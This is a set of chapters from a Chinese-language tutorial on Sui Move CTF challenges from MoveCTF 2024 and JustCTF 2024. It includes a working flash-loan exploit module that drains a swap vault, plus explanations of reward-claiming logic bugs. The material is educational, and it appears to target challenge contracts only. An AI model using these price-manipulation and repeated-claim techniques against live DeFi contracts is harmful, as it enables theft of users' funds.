[ ](../letsmove/task_8.html "Previous chapter") [ ](../MoveCTF2024/Swap.html "Next chapter")

[ ](../letsmove/task_8.html "Previous chapter") [ ](../MoveCTF2024/Swap.html "Next chapter")

# Swap.html
# 《From 0 to Hero : Move CTF 指北》

[ ](../print.html "Print this book")

# [Swap](#swap)

考察闪电贷 题目源码 https://github.com/movebit/movectf2024-day1/tree/main/swap

## [环境搭建](#环境搭建)

部署后，先调用初始化函数

```

    
    
    #!/bin/bash
    PackageID=0x2d1ee80d8152a1b3f941c915748a680a1467dcdffe3f261527b190deddf8e48a
    minta=0x5bc9a9a9ed82b9a0de90b6ec3926b162db1a5149937e88fb9c5e49e700d8cde9
    #ObjectType: 0x2d1ee80d8152a1b3f941c915748a680a1467dcdffe3f261527b190deddf8e48a::ctfa::MintA<0x2d1ee80d8152a1b3f941c915748a680a1467dcdffe3f261527b190deddf8e48a::ctfa::CTFA>
    a_type='0x2d1ee80d8152a1b3f941c915748a680a1467dcdffe3f261527b190deddf8e48a::ctfa::CTFA'
    mintb=0xb6bfd99e4341eaa3e630982750bcd4b75b1cd9d86dbeac46a83b84731bb15fb9
    #ObjectType: 0x2d1ee80d8152a1b3f941c915748a680a1467dcdffe3f261527b190deddf8e48a::ctfb::MintB<0x2d1ee80d8152a1b3f941c915748a680a1467dcdffe3f261527b190deddf8e48a::ctfb::CTFB>
    b_type='0x2d1ee80d8152a1b3f941c915748a680a1467dcdffe3f261527b190deddf8e48a::ctfb::CTFB'
    sui client call --package $PackageID \
            --module vault \
            --function initialize \
            --type-args $a_type $b_type \
            --args $minta $mintb \
    
    #  public entry fun initialize<A,B>(capa: MintA<A>, capb: MintB<B>,ctx: &mut TxContext) {
    #    let vault = Vault<A, B> {
    #      id: object::new(ctx),
    #      coin_a: coin::into_balance(ctfa::mint_for_vault(capa, ctx)),
    #      coin_b: coin::into_balance(ctfb::mint_for_vault(capb, ctx)),
    #      flashed: false
    #    };
    #    transfer::share_object(vault);
    #  }
    
```

初始化操作会给vault 100个coinA和100个coinB,给sender 10个coinA和10个coinB

## [分析](#分析)

题目要求把资金池抽干

```

    
    
      public fun get_flag<A,B>(vault: &Vault<A,B>, ctx: &TxContext) {
        assert!(
          balance::value(&vault.coin_a) == 0 && balance::value(&vault.coin_b) == 0, 123
        );
        event::emit(
          Flag {
            win: true,
            sender: tx_context::sender(ctx)
          }
        );
      }
    
```

交换时，按照资金池里两种token的比例进行兑换

```

    
    
      public fun swap_a_to_b<A,B>(vault: &mut Vault<A,B>, coina:Coin<A>, ctx: &mut TxContext): Coin<B> {
          let amount_out_B = coin::value(&coina) * balance::value(&vault.coin_b) / balance::value(&vault.coin_a);
          coin::put<A>(&mut vault.coin_a, coina);
          coin::take(&mut vault.coin_b, amount_out_B, ctx)
      }
    
```

即`output_B / intput_A = balance_B / balance_A`

使用闪电贷可以轻易的操纵这两种token的比例`balance_B / balance_A`

```

    
    
      public fun flash<A,B>(vault: &mut Vault<A,B>, amount: u64, a_to_b: bool, ctx: &mut TxContext): (Coin<A>, Coin<B>, Receipt) {
        assert!(!vault.flashed, 1);
        let (coin_a, coin_b) = if (a_to_b) {
        (coin::zero<A>(ctx), coin::from_balance(balance::split(&mut vault.coin_b, amount ), ctx))
        }
        else {
        (coin::from_balance(balance::split(&mut vault.coin_a, amount ), ctx), coin::zero<B>(ctx))
        };
        let receipt = Receipt {
          id: object::id(vault),
          a_to_b,
          repay_amount: amount
        };
        vault.flashed = true;
        (coin_a, coin_b, receipt)
      }
    
```

## [利用](#利用)

```

    
    
    /// Module: exp
    module exp::exp {
      use sui::tx_context::TxContext;
      use sui::balance::{Self, Balance};
      use sui::coin::{Self, Coin};
      use swap::vault::{Self, Vault,swap_a_to_b};
      public entry fun exp1<A,B>(vault: &mut Vault<A,B>, coina:Coin<A>, ctx: &mut TxContext) {
        //in vault, A:100,B:100
        //flashloan 99 coina
        let (coin_a, coin_b, receipt) = vault::flash(vault, 99, false, ctx);
        //in vault, A:1,B:100
        let mut input_balance= coin::into_balance(coina);//10
        let coinb = swap_a_to_b(vault,coin::from_balance(balance::split(&mut input_balance,1),ctx), ctx);
        transfer::public_transfer(coinb, tx_context::sender(ctx));
        let change = coin::from_balance(input_balance, ctx);
        transfer::public_transfer(change, tx_context::sender(ctx));
        //in vault, A:2,B:0
    
        //repay 99 coina
        vault::repay_flash(vault, coin_a, coin_b, receipt);
        //in vault, A:101,B:0
        // flashloan all
        let (coin_a, coin_b, receipt) = vault::flash(vault, 101, false, ctx);
        vault::get_flag(vault, ctx);
        vault::repay_flash(vault, coin_a, coin_b, receipt);
      }
    }
    
```

## [参考资料](#参考资料)

  * [MoveCTF 2024 Writeup](https://ambergroup.medium.com/movectf-2024-writeup-f74784e020c4)

[ ](../MoveCTF2024/index.html "Previous chapter") [ ](../MoveCTF2024/EasyGame.html "Next chapter")

[ ](../MoveCTF2024/index.html "Previous chapter") [ ](../MoveCTF2024/EasyGame.html "Next chapter")

# EasyGame.html
# 《From 0 to Hero : Move CTF 指北》

[ ](../print.html "Print this book")

# [EasyGame](#easygame)

这到题目直接在纸上演算下就行了

把源码翻译下

```

    
    
    house = [1 ,2 ,4 ,5 ,1 ,3 ,6 ,7 ,x ]
    
      v = [1 ,2 ,5 ,7 ,7 ,10,13,17,22]
    
```

可以理解为有house和v两组数据，求解x的值

22 = max(17,13+x)

推算出来x=9

[ ](../MoveCTF2024/Swap.html "Previous chapter") [ ](../MoveCTF2024/Kitchen.html "Next chapter")

[ ](../MoveCTF2024/Swap.html "Previous chapter") [ ](../MoveCTF2024/Kitchen.html "Next chapter")

# Kitchen.html
# 《From 0 to Hero : Move CTF 指北》

[ ](../print.html "Print this book")

# [Kitchen](#kitchen)

## [cook](#cook)

```

    
    
    assert!( bcs::to_bytes(&p) == x"0415a5b8a6f8c946bb0300bd9d997eb7038ad784faf2b802c5f122e1", 0);
    
```

```

    
    
    04 
    15a5
    b8a6
    f8c9
    46bb
    03 
    00bd
    9d99
    7eb7
    03 
    8ad7
    84fa
    f2b8
    02 
    c5f1
    22e1
    
```

数据是按照小端存储的，还需要调整下

```

    
    
    0xa515
    0xa6b8
    0xc9f8
    0xbb46
    0xbd00
    0x999d
    0xb77e
    0xd78a
    0xfa84
    0xb8f2
    0xf1c5
    0xe122
    
```

## [recook](#recook)

直接在题目里编写一个测试函数

```

    
    
      use std::debug;
      #[test]
      fun test_recook() {
      ///public fun recook (out: vector<u8>, status: &mut Status) {
        let p = Pizza {
          olive_oils: Cook<Olive_oil> {
            source: vector<Olive_oil>[
              get_Olive_oil(0xb9d9),
              get_Olive_oil(0xeb54),
              get_Olive_oil(0x9268),
              get_Olive_oil(0xc5f7),
              get_Olive_oil(0xa1ec),
              get_Olive_oil(0xd084),
            ]
          },
          yeast: Cook<Yeast> {
            source: vector<Yeast>[
              get_Yeast(0xbd00),
              get_Yeast(0xfc81),
              get_Yeast(0x999d),
              get_Yeast(0xb77e),
            ]
          },
          flour: Cook<Flour> {
            source: vector<Flour>[
              get_Flour(0xdcc7),
              get_Flour(0xcc7a),
              get_Flour(0x8f19),
              get_Flour(0x96b1),
              get_Flour(0x8a6d),
            ]
          },
          salt: Cook<Salt> {
            source: vector<Salt>[
              get_Salt(0x8b01),
              get_Salt(0xf1c5),
              get_Salt(0xc6ec),
            ]
          },
        };
        let out= bcs::to_bytes(&p);
        debug::print(&out);
      }
    
```

```

    
    
    $ sui move test
    INCLUDING DEPENDENCY Sui
    INCLUDING DEPENDENCY MoveStdlib
    BUILDING kitchen
    Running Move unit tests
    [debug] 0x06d9b954eb6892f7c5eca184d00400bd81fc9d997eb705c7dc7acc198fb1966d8a03018bc5f1ecc6
    [ PASS  ] 0x0::kitchen::test_recook
    Test result: OK. Total tests: 1; passed: 1; failed: 0
    
```

[ ](../MoveCTF2024/EasyGame.html "Previous chapter") [ ](../MoveCTF2024/Matrix.html "Next chapter")

[ ](../MoveCTF2024/EasyGame.html "Previous chapter") [ ](../MoveCTF2024/Matrix.html "Next chapter")

# Matrix.html
# 《From 0 to Hero : Move CTF 指北》

[ ](../print.html "Print this book")

# [Dynamic Matrix Traversal](#dynamic-matrix-traversal)

https://docs.sui.io/references/framework/move-stdlib/vector#0x1_vector_EINDEX_OUT_OF_BOUNDS

```

    
    
    const EINDEX_OUT_OF_BOUNDS: u64 = 131072;
    
```

vector最大长度是 131072 = 0x20000 可以穷举

由于数据不大，可以先在0x200范围内试试

直接在题目里编写测试函数

```

    
    
      use std::debug;
      #[test]
      fun test_up() {
        bruteforce(14365);
        bruteforce(2794155);
      }
      #[test_only]
      fun bruteforce(target:u64) {
        let i:u64 = 1;
        while (i < 0x200){
          let j:u64 = 1;
          while(j < 0x200){
            if(target == up(i,j)){
              debug::print(&target);
              debug::print(&i);
              debug::print(&j);
              return
            };
            j = j + 1;
          };
          i = i + 1;
        };
      }
    
```

```

    
    
    $ sui move test -i 10000000000000000000
    INCLUDING DEPENDENCY Sui
    INCLUDING DEPENDENCY MoveStdlib
    BUILDING dynamic_matrix_traversal
    Running Move unit tests
    [debug] 14365
    [debug] 3
    [debug] 169
    [debug] 2794155
    [debug] 5
    [debug] 89
    [ PASS  ] 0x0::matrix::test_up
    Test result: OK. Total tests: 1; passed: 1; failed: 0
    
```

[ ](../MoveCTF2024/Kitchen.html "Previous chapter") [ ](../MoveCTF2024/Subset.html "Next chapter")

[ ](../MoveCTF2024/Kitchen.html "Previous chapter") [ ](../MoveCTF2024/Subset.html "Next chapter")

# Subset.html
# 《From 0 to Hero : Move CTF 指北》

[ ](../print.html "Print this book")

# [Subset](#subset)

```

    
    
      const SUBSET1: vector<u256> = vector<u256>[1, 2, 3, 4, 5];
      const SUBSET1_k: u256 = 3;
      const SUBSET1_SUM: u256 = 10;
    
```

翻译下，就是在集合中寻找k = 3个元素，这些元素之和为SUM = 10

数据量大了后，就不能穷举了.这道题目考察动态规划算法

[ ](../MoveCTF2024/Matrix.html "Previous chapter") [ ](../MoveCTF2024/ZK1.html "Next chapter")

[ ](../MoveCTF2024/Matrix.html "Previous chapter") [ ](../MoveCTF2024/ZK1.html "Next chapter")

# ZK1.html
# 《From 0 to Hero : Move CTF 指北》

[ ](../print.html "Print this book")

# [ZK2](#zk2)

```

    
    
    $ pip install factordb-pycli 
    $ .local/bin/factordb 58567186824402957966382507182680956225095467533943200425018625513920465170743
    7014799331087956561 8333598376919903303 31379779552695955991 31926893031172029031
    
```

[ ](../MoveCTF2024/Subset.html "Previous chapter") [ ](../MoveCTF2024/ZK1.html "Next chapter")

[ ](../MoveCTF2024/Subset.html "Previous chapter") [ ](../MoveCTF2024/ZK1.html "Next chapter")

# ZK1.html
# 《From 0 to Hero : Move CTF 指北》

[ ](../print.html "Print this book")

# [ZK2](#zk2)

```

    
    
    $ pip install factordb-pycli 
    $ .local/bin/factordb 58567186824402957966382507182680956225095467533943200425018625513920465170743
    7014799331087956561 8333598376919903303 31379779552695955991 31926893031172029031
    
```

[ ](../MoveCTF2024/Subset.html "Previous chapter") [ ](../MoveCTF2024/ZK1.html "Next chapter")

[ ](../MoveCTF2024/Subset.html "Previous chapter") [ ](../MoveCTF2024/ZK1.html "Next chapter")

# OttherHub.html
# 《From 0 to Hero : Move CTF 指北》

[ ](../print.html "Print this book")

# [OttherHub](#ottherhub)

https://suiscan.xyz/testnet/object/0xe68f0db436ce78be23a3e40072d8e8d00daf825ba7d899068bddc742950c24b6/contracts

https://suiscan.xyz/testnet/object/0x07e8242a60e092af2ad9e1d84a67e313df39d94239c1190e4defe4d5fa29ed28

[ ](../MoveCTF2024/ZK1.html "Previous chapter") [ ](../JustCTF2024/index.html "Next chapter")

[ ](../MoveCTF2024/ZK1.html "Previous chapter") [ ](../JustCTF2024/index.html "Next chapter")

# index.html
# 《From 0 to Hero : Move CTF 指北》

[ ](../print.html "Print this book")

# [JustCTF 2024](#justctf-2024)

https://2024.justctf.team/challenges

有三道blockchain题目，都是sui move的

## [The Otter Scrolls](#the-otter-scrolls)

https://2024.justctf.team/challenges/11

## [Dark BrOTTERhood](#dark-brotterhood)

https://2024.justctf.team/challenges/13

## [World of Ottercraft](#world-of-ottercraft)

https://2024.justctf.team/challenges/12

[ ](../MoveCTF2024/OttherHub.html "Previous chapter") [ ](../JustCTF2024/TOS.html "Next chapter")

[ ](../MoveCTF2024/OttherHub.html "Previous chapter") [ ](../JustCTF2024/TOS.html "Next chapter")

# TOS.html
# 《From 0 to Hero : Move CTF 指北》

[ ](../print.html "Print this book")

# [The Otter Scrolls](#the-otter-scrolls)

https://2024.justctf.team/challenges/11

由于比赛结束后服务器已经关了，我又想学习下比赛平台，所以自己把比赛环境搭了起来. 小伙伴们可以直接使用

![tos](../images/tos.png)

像我一样的新手可以试试，体验下拿flag的感觉😁

## [部署题目](#部署题目)

实测至少需要买一台2核4G 、硬盘25G的vps

1.安装docker和compose

https://docs.docker.com/engine/install/debian/ https://docs.docker.com/compose/install/linux/

2.拉取镜像 https://hub.docker.com/r/embe221ed/otter_template/tags sha256:1868755b24d06342766c54dd6e0516f41b62cec1e992a036f77a0b0401476a04 下载需要大概16G磁盘空间

```

    
    
    docker pull embe221ed/otter_template:latest
    
```

3.解开tos_docker.tar.gz并修改docker-compose.yml (非必须)

在本地测试时，我改了两个地方:

  * 添加flag
  * 把服务端口改成了127.0.0.1:31337

```

    
    
    services:
     tos:
      environment:
       FLAG: justCTF{Th4t_sp3ll_looks_d4ngerous...keep_y0ur_distance}
       PORT: 31337
      build:
       context: ./
       dockerfile: ./Dockerfile
      ports:
       - "127.0.0.1:31337:31337"
      restart: always
    
```

4.最后执行docker compose up 或者 docker compose up -d即可

## [解题](#解题)

```

    
    
    0 % sui --version
    sui 1.27.0-homebrew
    
```

首先进入解题框架，把题目的地址(nc连接服务器获得)填入`dependency/Move.toml`

```

    
    
    test@vps ~/justctf/tos/sources/framework-solve
    0 % ls
    Cargo.lock Cargo.toml	dependency solve src
    test@vps ~/justctf/tos/sources/framework-solve
    0 % nc tos.movectf.com 31337
    [SERVER] Challenge modules published at: 542fe29e11d10314d3330e060c64f8fb9cd341981279432b03b2bd51cf5d489b%                                     
    test@vps ~/justctf/tos/sources/framework-solve
    0 % cat dependency/Move.toml
    [package]
    name = "challenge"
    version = "0.0.1"
    edition = "2024.beta"
    [dependencies]
    Sui = { git = "https://github.com/MystenLabs/sui.git", subdir = "crates/sui-framework/packages/sui-framework", rev = "devnet-v1.27.0" }
    [addresses]
    admin = "0xfccc9a421bbb13c1a66a1aa98f0ad75029ede94857779c6915b44f94068b921e"
    #challenge = "<ENTER ADDRESS OF THE PUBLISHED CHALLENGE MODULE HERE>"
    challenge = "0x542fe29e11d10314d3330e060c64f8fb9cd341981279432b03b2bd51cf5d489b"
    
```

然后编写solve

```

    
    
    test@vps ~/justctf/tos/sources/framework-solve
    0 % ls solve
    build Move.lock Move.toml sources
    test@vps ~/justctf/tos/sources/framework-solve
    0 % cat solve/sources/solve.move
    module solve::solve {
      // [*] Import dependencies
      use challenge::theotterscrolls;
      public fun solve(
        _spellbook: &mut theotterscrolls::Spellbook,
        _ctx: &mut TxContext
      ) {
        // Your code here...
        theotterscrolls::cast_spell(vector[1, 0, 3, 3, 3], _spellbook);
      }
    }
    
```

TOS这道题目比较简单，相当于一道签到题 按照指定顺序取出单词即可，解题代码只需要插入一行

```

    
    
        theotterscrolls::cast_spell(vector[1, 0, 3, 3, 3], _spellbook);
    
```

然后执行build，把编译后的字节码发送到服务器就能得到flag了

```

    
    
    test@vps ~/justctf/tos/sources/framework-solve
    0 % cd solve
    test@vps ~/justctf/tos/sources/framework-solve/solve
    0 % sui move build
    INCLUDING DEPENDENCY challenge
    INCLUDING DEPENDENCY Sui
    INCLUDING DEPENDENCY MoveStdlib
    BUILDING solve
    test@vps ~/justctf/tos/sources/framework-solve/solve
    0 % cat build/solve/bytecode_modules/solve.mv | nc tos.movectf.com 31337
    [SERVER] Challenge modules published at: 542fe29e11d10314d3330e060c64f8fb9cd341981279432b03b2bd51cf5d489b[SERVER] Solution published at cf07b5b91e5ea4b1c17442a0e626cbb77b6a1d9a3427e568f403a2c3eff95566[SERVER] Congrats, flag: justCTF{Th4t_sp3ll_looks_d4ngerous...keep_y0ur_distance}%
    
```

[ ](../JustCTF2024/index.html "Previous chapter") [ ](../JustCTF2024/DB.html "Next chapter")

[ ](../JustCTF2024/index.html "Previous chapter") [ ](../JustCTF2024/DB.html "Next chapter")

# DB.html
# 《From 0 to Hero : Move CTF 指北》

[ ](../print.html "Print this book")

# [DB](#db)

酒馆里有个任务榜单，里面有不超过25个怪兽，击杀可以获取奖励 获取奖励的函数存在逻辑漏洞,击杀榜单里第0个怪兽，可以领取所有怪兽的击杀奖金

https://github.com/m4sk93/movectf/blob/69e71452df1ebddbd552499d35a5248a95b5dd9f/justctf2024/db/sources/framework-solve/dependency/sources/dark_brotterhood.move#L201-L223

```

    
    
      #[allow(lint(self_transfer))]
      public fun get_the_reward(
        vault: &mut Vault<OTTER>,
        board: &mut QuestBoard,
        player: &mut Player,
        quest_id: u64,
        ctx: &mut TxContext,
      ) {
        let quest_to_claim = vector::borrow_mut(&mut board.quests, quest_id);
        assert!(quest_to_claim.fight_status == FINISHED, WRONG_STATE);
    
        let monster = vector::pop_back(&mut board.quests);
    
        let Monster {
          fight_status: _,
          reward: reward,
          power: _
        } = monster;
    
        let coins = coin::split(&mut vault.cash, (reward as u64), ctx); 
        coin::join(&mut player.coins, coins);
      }
    
```

[ ](../JustCTF2024/TOS.html "Previous chapter") [ ](../JustCTF2024/WOO.html "Next chapter")

[ ](../JustCTF2024/TOS.html "Previous chapter") [ ](../JustCTF2024/WOO.html "Next chapter")

# WOO.html
# 《From 0 to Hero : Move CTF 指北》

[ ](../print.html "Print this book")

# [WOO](#woo)

与上一道题目DB类似，问题还是出在获取奖励上

https://github.com/m4sk93/movectf/blob/69e71452df1ebddbd552499d35a5248a95b5dd9f/justctf2024/woo/sources/framework-solve/dependency/sources/quest.move#L265-L281

```

    
    
      public fun get_the_reward(vault: &mut Vault<OTTER>, board: &mut QuestBoard, player: &mut Player, ctx: &mut TxContext) {
        assert!(player.status != RESTING && player.status != PREPARE_FOR_TROUBLE && player.status != ON_ADVENTURE, WRONG_PLAYER_STATE);
    
        let monster = vector::remove(&mut board.quests, player.quest_index);
    
        let Monster {
          reward: reward,
          power: _
        } = monster;
    
        let coins = coin::split(&mut vault.cash, reward, ctx); 
        let balance = coin::into_balance(coins);
    
        balance::join(&mut player.wallet, balance);
    
        player.status = RESTING;
      }
    
```

设置黑名单防止重复获取奖励，

```

    
    
        assert!(player.status != RESTING && player.status != PREPARE_FOR_TROUBLE && player.status != ON_ADVENTURE, WRONG_PLAYER_STATE);
    
```

但是忘记了考虑玩家处于购物状态的情况

```

    
    
      public fun enter_tavern(player: &mut Player): TawernTicket {
        assert!(player.status == RESTING, WRONG_PLAYER_STATE);
        player.status = SHOPPING;
        TawernTicket{ total: 0, flag_bought: false }
      }
    
```

玩家可以领取奖励后购物，再领奖，再购物......

[ ](../JustCTF2024/DB.html "Previous chapter") [ ](../audit.html "Next chapter")

[ ](../JustCTF2024/DB.html "Previous chapter") [ ](../audit.html "Next chapter")

# audit.html
# 《From 0 to Hero : Move CTF 指北》

[ ](print.html "Print this book")

# [审计](#审计)

## [安全实践](#安全实践)

  * [SUI OBJECTS-SECURITY PRINCIPLES AND BEST PRACTICES](https://www.movebit.xyz/blog/post/Sui-Objects-Security-Principles-and-Best-Practices.html)

  * [Sui Move 安全实践](https://www.bilibili.com/video/BV1sy411Y7Dn/)




## [审计报告](#审计报告)

https://github.com/movebit/Sampled-Audit-Reports

[ ](JustCTF2024/WOO.html "Previous chapter")

[ ](JustCTF2024/WOO.html "Previous chapter")

# #from-0-to-hero--move-ctf-指北
# 《From 0 to Hero : Move CTF 指北》

[ ](print.html "Print this book")

# [《From 0 to Hero : Move CTF 指北》](#from-0-to-hero--move-ctf-指北)

什么要写这个教程?

Hello,我是一个Move新手，从web2转行到web3. 这里记录了我使用**费曼学习法**(以教为学，以输出代替输入)来学习Move和CTF的过程,欢迎小伙伴们一起交流:)

[TG群](https://t.me/movectf_cn)

立个Flag: 找个remote job,做一个web3数字游民，哈哈.

[ ](quick/index.html "Next chapter")

[ ](quick/index.html "Next chapter")
